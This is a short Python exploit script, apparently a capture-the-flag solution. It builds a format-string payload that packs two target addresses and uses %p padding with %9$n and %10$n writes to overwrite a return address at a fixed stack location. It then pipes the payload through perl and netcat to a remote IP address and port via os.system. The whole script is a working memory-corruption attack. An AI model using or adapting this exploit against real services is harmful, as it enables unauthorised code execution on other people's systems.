import os
import struct

EIP = 0xffffdd2c

def p(x):
    return struct.pack("<L", x)

def create_payload(eip):
    
    payload = p(eip)
    payload += p(eip + 2)
    payload += "%34419p"
    payload += "%9\$n"
    payload += "%33161p"
    payload += "%10\$n"
    
    return payload

def execute_cmd(eip):
    
    payload = create_payload(eip)
    
    cmd = "(perl -e 'print \""
    cmd += payload
    cmd += "\" . \"\n\"') | nc 18.223.228.52 13337"
    
    os.system(cmd)

execute_cmd(EIP)
